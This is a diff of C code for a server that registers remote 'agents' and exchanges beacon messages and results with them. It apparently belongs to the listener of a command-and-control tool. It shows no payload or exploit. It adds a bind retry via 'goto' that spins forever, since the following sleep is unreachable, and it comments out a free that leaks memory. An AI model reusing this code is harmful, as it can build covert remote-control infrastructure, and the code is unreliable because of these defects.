@@ -16,12 +16,13 @@
 #include "logs.h"
 
 #define BUFFER_SIZE 4096
+#define MAX_RESPONSE 20000
+
 
 struct thread_args {
     int sock;
     char ip[256];
 };
-
 
 void get_agent_id(const char *input, char output[65]) {
     unsigned char hash[SHA256_DIGEST_LENGTH];
@@ -39,35 +40,37 @@ void register_agent(cJSON *json, char *ip, int sock) {
     cJSON *mac = cJSON_GetObjectItem(json, "mac");
     cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
     cJSON *os =  cJSON_GetObjectItem(json, "os");
+    cJSON *arch = cJSON_GetObjectItem(json, "arch");
 
     char input[255];
-    snprintf(input, sizeof(input), "%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring);
+    snprintf(input, sizeof(input), "%s-%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring, arch->valuestring);
     char agent_id[65];
     get_agent_id(input, agent_id);
 
-
     //log
-    log_new_agent(agent_id, os->valuestring, hostname->valuestring, mac->valuestring);
+    log_new_agent(agent_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);
 
     // register to datbase (agent_id, os, ip, mac, hostname)
     // check if agent id exists
-   struct db_agents args;
-   strncpy(args.agent_id, agent_id, sizeof(args.agent_id) - 1);
-   args.agent_id[sizeof(args.agent_id) - 1] = '\0';
-   strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
-   args.os[sizeof(args.os) - 1] = '\0';
-   strncpy(args.ip, ip, sizeof(args.ip) - 1);
-   args.ip[sizeof(args.ip) - 1] = '\0';
-   strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
-   args.mac[sizeof(args.mac) - 1] = '\0';
-   strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
-   args.hostname[sizeof(args.hostname) - 1] = '\0';
+    struct db_agents args;
+    strncpy(args.agent_id, agent_id, sizeof(args.agent_id) - 1);
+    args.agent_id[sizeof(args.agent_id) - 1] = '\0';
+    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
+    args.os[sizeof(args.os) - 1] = '\0';
+    strncpy(args.ip, ip, sizeof(args.ip) - 1);
+    args.ip[sizeof(args.ip) - 1] = '\0';
+    strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
+    args.mac[sizeof(args.mac) - 1] = '\0';
+    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
+    args.hostname[sizeof(args.hostname) - 1] = '\0';
 
+    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
+    args.arch[sizeof(args.arch) - 1] = '\0';
     AgentsTable(args);
 
     // reply with agent id
     cJSON *json_reply = cJSON_CreateObject();
-    cJSON_AddStringToObject(json_reply, "type", "ack");
+    cJSON_AddStringToObject(json_reply, "mode", "ack");
     cJSON_AddStringToObject(json_reply, "agent_id", agent_id);
 
     char *reply = cJSON_Print(json_reply);
@@ -119,7 +122,8 @@ void beacon(cJSON *json, int sock) {
         send(sock, reply, strlen(reply), 0);
         // recv response and log to database
         // buffer response
-        char buffer[BUFFER_SIZE];
+        // respose with result
+        char buffer[MAX_RESPONSE];
         int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
         if (bytes_received <= 0) {
             perror("recv failed (beacon func)");
@@ -174,8 +178,8 @@ void *agent_handler(void *args) {
         beacon(json, sock);
     } // add session mode
 
-    cJSON_Delete(json);
-    close(sock);     
+    //cJSON_Delete(json);
+    close(sock);
     free(args);
     return NULL;
 }
@@ -197,8 +201,11 @@ void *agent_conn(void *port) {
     serverAddr.sin_port = htons(AGENT_PORT);
     serverAddr.sin_family = AF_INET;
 
+    BIND:
     if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
         perror("binding failed");
+        goto BIND;
+        sleep(30);
         close(serverSock);
         return NULL;
     }
